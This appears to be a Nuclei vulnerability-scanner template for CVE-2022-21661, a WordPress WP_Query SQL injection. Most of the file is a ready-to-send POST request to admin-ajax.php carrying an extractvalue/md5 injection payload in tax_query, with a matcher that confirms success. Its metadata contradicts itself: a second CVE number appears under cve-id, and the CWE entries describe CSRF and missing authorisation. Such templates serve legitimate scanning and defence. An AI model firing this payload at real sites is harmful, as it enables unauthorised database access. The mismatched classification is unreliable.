id: CVE-2022-21661

info:
  name: WordPress v4.1~v5.8.2 WP_Query SQL Injection POC
  author: capiton
  severity: high
  description: WordPress v4.1~v5.8.2 WP_Query SQL Injection POC
  reference:
    - https://github.com/z92g/CVE-2022-21661
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-1020
    cwe-id: CWE-352,CWE-862
  tags: wpscan,wp,wp-plugin,wordpress,cve,cve2022,unauth

variables:
  rand: "{{rand_int(200000000, 210000000)}}"
  md5_rand: "{{md5(rand)}}"

requests:
  - raw:
      - |
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        action=test&data={"tax_query":{"0":{"field":"term_taxonomy_id","terms":["111) and extractvalue(rand(),concat(0x5e,md5({{rand}}),0x5e))#"]}}}

    req-condition: true
    matchers-condition: and
    matchers:
      - type: word
        condition: and
        part: body
        words:
          - "{{md5_rand}}"

